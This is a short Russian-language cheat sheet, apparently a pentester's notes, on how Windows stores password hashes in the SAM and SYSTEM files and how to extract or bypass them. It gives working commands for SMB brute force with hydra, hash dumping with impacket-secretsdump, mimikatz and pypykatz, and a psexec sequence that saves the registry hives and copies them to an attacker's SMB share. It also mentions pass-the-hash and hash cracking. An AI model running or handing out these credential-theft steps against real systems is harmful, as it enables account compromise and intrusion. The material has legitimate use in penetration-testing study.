#### Принцип работы:
---
1. Пользователь **вводит пароль**.
2. **Пароль хэшируется** по специальному алгоритму (по одной из версий - MD5_HMAC).
3. Полученный **хэш шифруется** с помощью специального ключа "bootkey" (который хранится в файле `C:\Windows\System32\config\SYSTEM`) и сохраняется в файл `C:\Windows\System32\config\SAM`.
#### Способы обхода:
---
а. Удаленный брутфорс.

```bash title:"Использование hydra"
1. hydra -L users.txt -P passwords.txt 192.168.1.10 smb
```

б. Удаленное получение хэшей паролей из файлов `SAM/SYSTEM`, если известен пароль админа:

```bash title:"А. Использование impacket-secretsdump"
impacket-secretsdump user1:111@192.168.178.13 # - расшифрованные хэши
```

```bash title:"Использование mimikatz"
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords full
```

в. Получение на локальной машине (хэшей паролей):

```bash title:"1. Использование impacket-secretsdump"
impacket-secretsdump -sam SAM -system SYSTEM LOCAL.
```
```bash title:"2. Использование pypikatz с дампом lsass"
pypikatz lsa minidump lsass.dmp # – получение расшифрованных хэшей паролей.
```
```bash title:"3. Использование impacket-smbserver и impacket-psexec"
impacket-smbserver share $(pwd) -smb2support -> 
impacket-psexec DOMAIN/user:pass@ipAddress -> 
echo y| reg save hklm/SAM C:\Windows\Temp -> 
echo y| reg save hklm/SYSTEM C:\Windows\Temp -> 
copy C:\Windows\Temp\SAM \\localIpAddress\share -> 
copy C:\Windows\Temp\SYSTEM \\localIpAddress\share # – получение SAM/SYSTEM через общую папку.
```
4. Модули Metasploit
5. Cain&Abel, SAMInside
6. Различные приложения (например, `impacket`) в сочетании с методом "pass-the-hash".
г. Получение на локальной машине, где требуется найти пароли, с помощью программ:
1. `fgdump.exe` (только локальное применение и только администратор) – расшифрованные хэши паролей.
2. Практически все вышеназванные программы.
д. Сброс пароля с помощью WindowsPE или другой LiveUSB.
\*. Взлом хэшей:
1. hydra
2. john the ripper
